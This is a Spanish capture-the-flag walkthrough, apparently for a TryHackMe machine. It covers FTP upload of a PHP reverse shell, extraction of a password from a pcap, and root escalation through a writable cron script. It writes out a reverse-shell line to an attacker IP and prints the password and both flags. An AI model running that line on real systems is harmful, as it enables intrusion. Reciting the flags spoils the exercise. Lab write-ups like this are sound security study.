# Walkthrough: Máquina Ubuntu 16.04 (CTF Style)

## Resumen del ataque

1. Escaneo de puertos → se descubren FTP (21), SSH (22) y HTTP (80)
2. Enumeración web → se encuentra el directorio `/files`
3. Acceso anónimo por FTP → se sube un reverse shell en PHP
4. Ejecución del reverse shell → se obtiene acceso como usuario `www-data`
5. Enumeración del sistema → se encuentra un archivo `recipe.txt` (pista) y una captura de red `suspicious.pcapng`
6. Análisis del pcap → se extrae una contraseña en texto claro
7. Acceso por SSH como usuario `lennie` → se obtiene la flag de usuario
8. Escalada de privilegios mediante tarea cron mal configurada → se obtiene shell como `root` y la flag de root

---

## Fase 1: Reconocimiento

### Escaneo de puertos con Nmap

Desde Kali se realiza un escaneo de todos los puertos de la máquina objetivo. El resultado muestra tres puertos abiertos: el 21 (FTP), el 22 (SSH) y el 80 (HTTP).

### Enumeración web con Gobuster

Se ejecuta Gobuster contra el servidor web usando un diccionario de directorios comunes. La herramienta descubre el directorio `/files`. Al acceder a `http://10.128.167.30/files/ftp/` desde el navegador, se ve un directorio vacío.

---

## Fase 2: Acceso inicial

### Conexión FTP como usuario anónimo

Desde Kali se conecta al servicio FTP usando el usuario `anonymous` sin contraseña. Una vez dentro, se sube el archivo `php-reverse-shell.php` (un script típico de PentestMonkey) al directorio `/ftp`.

### Preparación del listener en Kali

Antes de ejecutar el reverse shell, se pone en escucha el puerto 2233 con netcat.

### Ejecución del reverse shell

Desde el navegador se accede a la ruta donde se subió el archivo PHP. Esto ejecuta el script y se recibe una conexión de vuelta en Kali, obteniendo una shell interactiva con el usuario `www-data`.

---

## Fase 3: Enumeración del sistema

Una vez dentro como `www-data`, se listan los archivos del directorio raíz. Se encuentra un archivo llamado `recipe.txt`. Al leerlo, se ve un mensaje críptico que parece contener una pista: menciona "to Id him" (posible referencia a un comando o usuario).

Continuando con la exploración, se descubre un directorio llamado `incidents`. Dentro hay un archivo `suspicious.pcapng`, que es una captura de tráfico de red. Para poder analizarlo desde Kali, se copia al directorio `/var/www/html/files/ftp`, lo que permite descargarlo desde el navegador.

---

## Fase 4: Análisis del pcap

Se descarga el archivo `suspicious.pcapng` y se abre con Wireshark. Dentro de la captura se encuentra una contraseña en texto claro: `c4ntg3t3n0ughsp1c3`.

Se intenta usar esta contraseña con el comando `sudo -l` desde la sesión de `www-data`, pero falla después de tres intentos.

Luego se revisa el archivo `/etc/passwd` para ver los usuarios del sistema. Se identifican dos usuarios no estándar: `lennie` y `ftpsecure`.

---

## Fase 5: Acceso por SSH como Lennie

Desde Kali se intenta una conexión SSH con el usuario `lennie` usando la contraseña encontrada en el pcap. La conexión es exitosa.

Una vez dentro del home de `lennie`, se listan los archivos y se encuentra `user.txt`. Al leerlo se obtiene la primera flag.

**Flag de usuario:** `THM{03ce3d619b80ccbfb3b7fc81e46c0e79}`

---

## Fase 6: Escalada a root

Para descubrir procesos automáticos en el sistema, se sube la herramienta `pspy64` desde Kali a la máquina víctima (por ejemplo, usando un servidor HTTP simple con Python). Se le dan permisos de ejecución y se ejecuta.

`pspy` revela que hay una tarea programada (cron) que ejecuta periódicamente el script `/etc/print.sh`.

Desde la sesión de `lennie` se escribe en ese archivo un comando que envía una reverse shell a la máquina atacante. El contenido del script es: `sh -i >& /dev/tcp/192.168.153.205/1234 0>&1`.

En Kali se pone en escucha el puerto 1234 con netcat. Cuando el cron ejecuta el script, se recibe una shell con permisos de `root`.

Dentro de la shell de root, se listan los archivos y se encuentra `root.txt`. Al leerlo se obtiene la flag final.

**Flag de root:** `THM{f963aaa6a430f210222158ae15c3d76d}`

---

## Resumen de flags

| Flag | Valor |
|------|-------|
| Usuario (lennie) | `THM{03ce3d619b80ccbfb3b7fc81e46c0e79}` |
| Root | `THM{f963aaa6a430f210222158ae15c3d76d}` |

---

## Lecciones aprendidas

- El acceso anónimo a FTP combinado con un servidor web puede permitir ejecución remota de código.
- Las capturas de red (pcap) pueden contener información sensible como contraseñas en texto claro.
- Las contraseñas se reutilizan a menudo entre diferentes servicios (FTP, SSH, etc.).
- Las tareas cron mal configuradas o con permisos de escritura inadecuados son una puerta común para escalar privilegios.
- Herramientas como `pspy` son muy útiles para descubrir procesos automáticos cuando no se tienen permisos para ver crontabs.
